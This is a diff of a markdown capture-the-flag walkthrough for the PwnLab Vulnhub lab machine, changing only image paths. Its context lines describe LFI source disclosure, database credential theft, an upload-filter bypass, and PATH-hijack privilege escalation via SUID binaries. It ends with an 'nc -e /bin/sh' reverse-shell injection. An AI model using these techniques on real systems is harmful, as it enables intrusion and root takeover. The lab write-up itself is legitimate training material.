@@ -76,7 +76,7 @@ nmap -sS -sV -p- -T4 192.168.80.131
 >
 > 192.168.80.131 is our target
 
-![](C:\Users\mcAnderson\Documents\Intern\Vulnhub\init\nmap.png)
+![](./nmap.png)
 
 This scan reveals the following information about the target address:
 
@@ -94,7 +94,7 @@ The two most important details here are that there is a running Apache Webserver
 
 The application interface is very simple, there are three links: Home, Login, and Upload.  We currently have access to the Home and the Login page, but the Upload page is locked behind account authentication.
 
-![](C:\Users\mcAnderson\Documents\Intern\Vulnhub\init\pwnlab.png)
+![](./pwnlab.png)
 
 Before we begin attempting various exploits (SQL Injection, XSS, etc.) it is always important to enumerate more before you begin custom exploitation.  To gain more information on this web service we will utilize two tools: Nikto, and Dirbuster.
 
@@ -104,7 +104,7 @@ Dirbuster is an important tool to run during the initial discovery of a web serv
 
 > http://192.168.80.131:80 for our target
 
-![](C:\Users\mcAnderson\Documents\Intern\Vulnhub\init\dirbuster.png)
+![](./dirbuster.png)
 
 As shown above, dirbuster is detecting the existence of paths on the server via GET requests, and will take a while.  In the meantime we can enumerate further with another tool, Nikto.
 
@@ -116,7 +116,7 @@ Nikto is a web vulnerability scanner designed to point out glaringly obvious vul
 nikto -h 192.168.80.131
 ```
 
-![](C:\Users\mcAnderson\Documents\Intern\Vulnhub\init\nikto.png)
+![](./nikto.png)
 
 Nikto discovers some interesting details about the site, namely the `config.php` file on the server, as well as an `/images/` directory.  Navigating to the `/images/` directory reveals the background image for the site, and attempting to navigate to the `config.php` file reveals no access permitted.
 
@@ -157,7 +157,7 @@ That didn't work either, but the server may be attempting to append file extensi
 
 As we can see, the server took the `config.php` file, encoded the source into Base64, and then wasn't able to interpret it as code, so instead it includes the base64 text onto the webpage.
 
-![](C:\Users\mcAnderson\Documents\Intern\Vulnhub\init\phpfilterbypass.png)
+![](./phpfilterbypass.png)
 
 We can pull down this file and decode it from Base64 to source code using Linux built-ins `cUrl`, and `base64`.
 
@@ -201,7 +201,7 @@ This appears to be the login credentials for the MySQL database running on port 
 mysql -u root -p -h 192.168.80.131 Users
 ```
 
-![](C:\Users\mcAnderson\Documents\Intern\Vulnhub\init\mysqldb.png)
+![](./mysqldb.png)
 
 Logging into the Users table as specified in the retrieved `config.php` file lets us have full access to the database, and we can print out all the details of the users.
 
@@ -209,7 +209,7 @@ Logging into the Users table as specified in the retrieved `config.php` file let
 SELECT * FROM Users;
 ```
 
-![](C:\Users\mcAnderson\Documents\Intern\Vulnhub\init\users.png)
+![](./users.png)
 
 Gives us the Usernames, and Base64 encoded passwords of all of the users in the database.  We can now presumably use these details to login to the `Login.php` service running on the web server.  But first we need to decode the passwords, and this can be done in the same way as before.
 
@@ -223,7 +223,7 @@ Using the login details from above, we can login to the web service as any of th
 
 Navigating the the Upload page after logging in reveals a very simple uploading form, provide a file, and upload to the server.  After attempting to upload a simple reverse shell PHP file, we are introduced to an error `Not allowed extension, please upload images only.`  So there are most likely some file checks going on behind the scenes, luckily, from before we have the source code for this file.
 
-![](C:\Users\mcAnderson\Documents\Intern\Vulnhub\init\badext.png)
+![](./badext.png)
 
 Opening the source code to `upload.php` reveals the following code:
 
@@ -324,11 +324,11 @@ Just by adding GIF87a to the top of our file, when the server checks using `geti
 
 > 47 49 46 38 37 61
 
-![](C:\Users\mcAnderson\Documents\Intern\Vulnhub\init\signature.png)
+![](./signature.png)
 
 We should now be able to upload the malicious GIF file to the server, and then use the previously exploited LFI to include the PHP code and spawn our reverse shell.   However, as previously learned, we won't be able to call our file using the LFI exploit unless it ends in PHP, and the server strictly disallows anything but the whitelisted extensions.  We might be able to get around this by editing the request headers to trick it into thinking that the extension is a GIF, when we're really uploading a file named `shell.php`.
 
-![](C:\Users\mcAnderson\Documents\Intern\Vulnhub\init\post.png)
+![](./post.png)
 
 The file we are actually uploading in this scenario is `shell.php`, however we intercepted the POST request using Burp, and edited the filename field to `shell.gif` and the Content-Type field to `image/gif`.  Using this, we are able to upload a file named `shell.php` to the web server, and potentially call it using the previous LFI exploit.   However, a couple of things are standing in our way, when we upload the file to the server, there is another line of code in the `upload.php` file that prevents us from invoking this file.
 
@@ -339,7 +339,7 @@ $uploadFile = $uploaddir . md5(basename($_FILES['file']['name'])).$file_ext;
 
 No matter what we make our extension, whether legitimate, or modified via the POST request, it will always append the extension after the last period to the end of the file.  Another important bit here is that it is not uploading our image with the direct file-name, but instead is hashing the filename with MD5.  So even if the extension wasn't changed, our original LFI exploit with `/resource=shell` wouldn't work because of the hashed filename.  However since we know the directory where the images are being sent, we can navigate there using the web browser to see the hashed filenames that we've uploaded, and as we can see the most recent file will be our `shell.php.gif` file.
 
-![](C:\Users\mcAnderson\Documents\Intern\Vulnhub\init\uploadimages.png)
+![](./uploadimages.png)
 
 So we need to find another way to invoke this file, or even another completely new exploit, sometimes in pentesting you need to turn around and drop all of the work because it just won't work.  Luckily this isn't the case for this, there is another LFI exploit that we missed, which we can see by looking at the source code for the `index.php` page.
 
@@ -361,7 +361,7 @@ if (isset($_GET['page'])) {
 
 We'll start with the second snippet of code.. this is the LFI exploit that we have been previously exploiting to read the source code for the website.  As you can see, it is using PHP `include()` to dump the file onto the webpage, and no matter the value passed to the parameter, it will append a PHP extension.  So we cannot use this to call our `HASHSHELL.gif` file in the upload directory.   However, the first snippet reveals an even more exploitable PHP LFI, but this time using a COOKIE injection.  The LFI is the exact same but instead of using the `page` URL parameter, we will be injecting a cookie, namely `lang`, and we don't even need to worry about messing with file extensions, we can include anything, even system files.
 
-![](C:\Users\mcAnderson\Documents\Intern\Vulnhub\init\revshell.png)
+![](./revshell.png)
 
 And success, we have spawned a reverse shell connection into the target server.  As can be seen above the terminal in the image, there is a Cookie parameter named `lang` with the value of `../upload/image_hash.gif` and now we have arbitrary RCE on the server.
 
@@ -387,21 +387,21 @@ su kent
 
 will allow us to login as the specified user, provide we have the correct password, which we do.
 
-![](C:\Users\mcAnderson\Documents\Intern\Vulnhub\init\kent.png)
+![](./kent.png)
 
 Navigating around with kent reveals no permissions outside the /var/www/ directories, and no files in his home directory.  So we can do the same with all of the users we know in order to try and get some higher privileges.
 
-![](C:\Users\mcAnderson\Documents\Intern\Vulnhub\init\mike.png)
+![](./mike.png)
 
 Attempting to login with Mike reveals that we don't have the correct credentials, so we can try the last account Kane.
 
-![](C:\Users\mcAnderson\Documents\Intern\Vulnhub\init\perms.png)
+![](./perms.png)
 
 * **Note:** *the `cat` and `new` files are files that were created later on, at this point in the exploit the only file that will be in this directory is `msgmike`.*
 
 Kane still has the same permissions as Kent, but he has an interesting file in his home directory `msgmike` which is owned by Mike.  We can learn a little bit more about this particular file by running the `file` command, which will tell us exactly what is contained in the file.
 
-![](C:\Users\mcAnderson\Documents\Intern\Vulnhub\init\filemsgmike.png)
+![](./filemsgmike.png)
 
 As we can see from the output, it is a 32-bit LSB executable, and most importantly the SETUID bit is set, below is an excerpt from the manpage entry for SETUID.
 
@@ -417,7 +417,7 @@ What this means is that no matter what user runs this program, all of the functi
 
 It seems to just be a program to display the contents of the message in Mike's directory, we can find even more information about it by displaying the contents.  We can do this by using the `strings` command which will display all "human readable" strings that are contained within the file.
 
-![](C:\Users\mcAnderson\Documents\Intern\Vulnhub\init\stringsmsgmike.png)
+![](./stringsmsgmike.png)
 
 * **Note**: Because this file is an executable, the output of the commands are garbled, a much better way to perform executable analysis is using a debugger (IDA, GDB, R2).
 
@@ -445,7 +445,7 @@ echo "whoami" > /home/kane/cat
 chmod +x /home/kane/cat
 ```
 
-![](C:\Users\mcAnderson\Documents\Intern\Vulnhub\init\pathexploit.png)
+![](./pathexploit.png)
 
 As we can see from the output of running `msgmike` the `whoami` command returns Mike, this means we have arbitrary RCE as the privileged user Mike.  Now we can make something more devious, any BASH commands we wish to run we can now exploit, as long as the user Mike has the permissions to run them.
 
@@ -455,7 +455,7 @@ echo "/bin/cat /root/flag.txt" > cat
 
 We edit our cat executable to attempt to print the contents where the flag is, if Mike has full permissions we should be able to read the contents at `/root/flag.txt`.
 
-![](C:\Users\mcAnderson\Documents\Intern\Vulnhub\init\permdenied.png)
+![](./permdenied.png)
 
 * **Note**: In this program you must call `cat` by its absolute path `(/bin/cat)` or else we will end up exploiting ourselves by calling our own `cat` program.
 
@@ -465,11 +465,11 @@ It seems that Mike doesn't have the permissions we though he had, time to do a l
 echo "ls -ltr /home/mike" > cat
 ```
 
-![](C:\Users\mcAnderson\Documents\Intern\Vulnhub\init\mikehome.png)
+![](./mikehome.png)
 
 This reveals a program named `msg2root` in Mike's home directory, with the SETUID bit set again, but this time the owner is `root`.  If this is the same sort of exploit, we can just chain together both `PATH` exploits to have arbitrary RCE as `root`.   Doing the same file analysis on this new binary as before reveals the solution to our previous exploit.
 
-![](C:\Users\mcAnderson\Documents\Intern\Vulnhub\init\msg2rootsource.png)
+![](./msg2rootsource.png)
 
 In this program the command is invoked absolutely `(/bin/echo)`instead of relatively `(echo)`, meaning we can't alter which program is actually invoked.  However it appears to be reading input from `stdin` and appending` (>>)` that to the file in `/root/messages.txt`, without sanitization!  This means that we can chain together the two exploits, and pass some malicious commands to the `msg2root` executable and possible get arbitrary RCE.
 
@@ -500,7 +500,7 @@ echo '/home/mike/./msg2root < /home/kane/input' > cat
 ./msgmike
 ```
 
-![](C:\Users\mcAnderson\Documents\Intern\Vulnhub\init\completed.png)
+![](./completed.png)
 
 We have successfully achieved RCE as root, but that is not the goal of rooting a box, we want to be root with a shell that we can manipulate.  To do this we can change the contents of our `input` file to be more malicious and spawn another reverse shell for us.  We can start listening on the host machine for any connections on the port 1235
 
@@ -516,5 +516,5 @@ $(nc -e /bin/sh 192.168.80.129 1235)
 
 with our newly created payload we can once again chain our exploits together, invoke `msgmike` and achieve a remote root shell on our own host computer to fully root the box.
 
-![](C:\Users\mcAnderson\Documents\Intern\Vulnhub\init\rootred.png)
+![](./rootred.png)
 
